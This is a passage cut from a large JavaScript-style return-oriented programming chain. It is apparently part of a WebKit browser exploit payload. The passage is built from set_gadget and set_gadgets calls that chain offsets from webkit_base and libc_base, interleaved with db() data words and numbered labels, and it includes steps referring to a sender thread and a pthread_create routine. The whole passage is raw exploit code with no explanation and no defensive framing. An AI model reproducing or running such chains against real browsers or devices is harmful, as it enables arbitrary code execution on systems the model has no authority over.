webkit_base+3236123 //pop r9
]);
//L3297:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L3298:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
//L3299:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3300:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+21212296, //cmp rax, rsi ; sete al
libc_base+226597, //movzx eax, al
webkit_base+5507491, //shl rax, 3
libc_base+764760, //pop rsi
ropchain+1189608, //L3301+8
libc_base+501454, //add rax, rsi
libc_base+501611, //mov rax, [rax]
libc_base+764760, //pop rsi
ropchain+1189600, //L3301
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+782311 //pop rsp
]);
//L3301:
db([0, 0]); // 0x0
set_gadgets([
ropchain+1189624, //L3301+24
ropchain+1195000, //L3296
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L3302:
db([4294967244, 4294967295]); // -0x34
set_gadget(libc_base+763368,); //pop rcx
//L3303:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1189744, //L3305
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1189760, //L3306
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L3305:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3306:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1189920, //L3309
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1189952, //L3311
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1189904, //L3308
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1189936, //L3310
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3308:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L3309:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3310:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3311:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1190032, //L3312
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1190048, //L3313
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L3312:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3313:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1190144, //L3315
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1190128, //L3314
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L3314:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3315:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1190240, //L3317
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L3316:
db([4294967248, 4294967295]); // -0x30
set_gadget(libc_base+763368,); //pop rcx
//L3317:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1190328, //L3319
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1190344, //L3320
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L3319:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3320:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1190488, //L3324
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1190456, //L3322
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1190472, //L3323
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L3322:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3323:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3324:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1190584, //L3326
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L3325:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+763368,); //pop rcx
//L3326:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1190672, //L3328
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1190688, //L3329
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L3328:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3329:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1190848, //L3332
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1190880, //L3334
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1190832, //L3331
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1190864, //L3333
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3331:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L3332:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3333:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3334:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1190976, //L3336
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1190960, //L3335
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L3335:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3336:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608, //pop rax
//L3338:
ropchain+1191080, //L3337
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+782311, //pop rsp
ropchain+1201920, //L3339
//L3337:
libc_base+853989, //mov rax, rcx
libc_base+764760 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1191168, //L3341
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L3340:
db([4294967240, 4294967295]); // -0x38
set_gadget(libc_base+763368,); //pop rcx
//L3341:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+3488438, //mov [rax], ecx
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L3343:
db([4294967240, 4294967295]); // -0x38
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1191296, //L3345
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1191312, //L3346
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L3345:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3346:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1191472, //L3349
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1191504, //L3351
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1191456, //L3348
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1191488, //L3350
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3348:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L3349:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3350:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3351:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1191584, //L3352
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1191600, //L3353
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L3352:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3353:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1191696, //L3355
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1191680, //L3354
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L3354:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3355:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1191776, //L3356
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3356:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L3357:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3358:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1191936, //L3360
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1191952, //L3361
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1191920, //L3359
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L3359:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3360:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3361:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
webkit_base+6378709, //cmp rax, rcx ; sete al
webkit_base+2115150, //setle al
libc_base+226597, //movzx eax, al
libc_base+764760, //pop rsi
ropchain+1192128, //L3363
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1192144, //L3364
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1192112, //L3362
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3362:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L3363:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3364:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1192256, //L3366
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1192304, //L3369
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1192272, //L3367
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3366:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L3367:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
//L3368:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3369:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+21212296, //cmp rax, rsi ; sete al
libc_base+226597, //movzx eax, al
webkit_base+5507491, //shl rax, 3
libc_base+764760, //pop rsi
ropchain+1192416, //L3370+8
libc_base+501454, //add rax, rsi
libc_base+501611, //mov rax, [rax]
libc_base+764760, //pop rsi
ropchain+1192408, //L3370
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+782311 //pop rsp
]);
//L3370:
db([0, 0]); // 0x0
set_gadgets([
ropchain+1192432, //L3370+24
ropchain+1192448, //L3365
libc_base+782311, //pop rsp
ropchain+1195032, //L3371
//L3365:
libc_base+764760, //pop rsi
ropchain+1192504, //L3373
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L3372:
db([4294967248, 4294967295]); // -0x30
set_gadget(libc_base+763368,); //pop rcx
//L3373:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1192592, //L3375
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1192608, //L3376
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L3375:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3376:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1192752, //L3380
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1192720, //L3378
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1192736, //L3379
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L3378:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3379:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3380:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1192824, //L3382
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L3382:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1192880, //L3383
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L3383:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1192976, //L3386
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L3385:
db([4294967240, 4294967295]); // -0x38
set_gadget(libc_base+763368,); //pop rcx
//L3386:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1193064, //L3388
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1193080, //L3389
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L3388:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3389:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1193240, //L3392
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1193272, //L3394
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1193224, //L3391
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1193256, //L3393
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3391:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L3392:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3393:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3394:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1193400, //L3396
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1193416, //L3397
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1193384, //L3395
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L3395:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3396:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3397:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1193504, //L3399
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L3399:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1193560, //L3400
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L3400:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1193648, //L3403
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L3402:
db([4294967248, 4294967295]); // -0x30
set_gadget(libc_base+763368,); //pop rcx
//L3403:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+20307877, //mov [rax], rcx
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L3405:
db([4294967244, 4294967295]); // -0x34
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1193776, //L3407
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1193792, //L3408
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L3407:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3408:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1193952, //L3411
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1193984, //L3413
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1193936, //L3410
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1193968, //L3412
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3410:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L3411:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3412:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3413:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1194080, //L3415
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1194064, //L3414
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L3414:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3415:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1194176, //L3417
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L3416:
db([4294967240, 4294967295]); // -0x38
set_gadget(libc_base+763368,); //pop rcx
//L3417:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1194264, //L3419
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1194280, //L3420
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L3419:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3420:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1194440, //L3423
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1194472, //L3425
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1194424, //L3422
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1194456, //L3424
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3422:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L3423:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3424:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3425:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1194600, //L3427
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1194616, //L3428
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1194584, //L3426
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L3426:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3427:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3428:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+835093, //sub rax, rcx ; sbb rdx, rcx
libc_base+764760, //pop rsi
ropchain+1194776, //L3430
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1194792, //L3431
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1194760, //L3429
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3429:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L3430:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3431:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1194912, //L3434
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1194880, //L3432
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+144605 //pop rdi
]);
//L3432:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
//L3433:
db([4294967244, 4294967295]); // -0x34
set_gadget(libc_base+763368,); //pop rcx
//L3434:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+3488438, //mov [rax], ecx
libc_base+764760, //pop rsi
ropchain+1194976, //L3437
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L3437:
db([0, 0]); // 0x0
set_gadgets([
libc_base+782311, //pop rsp
ropchain+1195016, //L3436
//L3296:
libc_base+782311, //pop rsp
ropchain+1195032, //L3371
//L3436:
libc_base+782311, //pop rsp
ropchain+1188888, //L3281
//L3371:
//L3160:
libc_base+759608 //pop rax
]);
//L3439:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608, //pop rax
//L3440:
ropchain+1156680, //_sender_thread
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L3441:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1195232, //L3443
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L3442:
db([4294965192, 4294967295]); // -0x838
set_gadget(libc_base+759608,); //pop rax
//L3443:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608, //pop rax
//L3445:
ropchain+1195344, //L3444
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+782311, //pop rsp
ropchain+1131984, //_pthread_create__rop
//L3444:
libc_base+853989, //mov rax, rcx
libc_base+764760 //pop rsi
]);
db([4294967264, 4294967295]); // -0x20
set_gadgets([
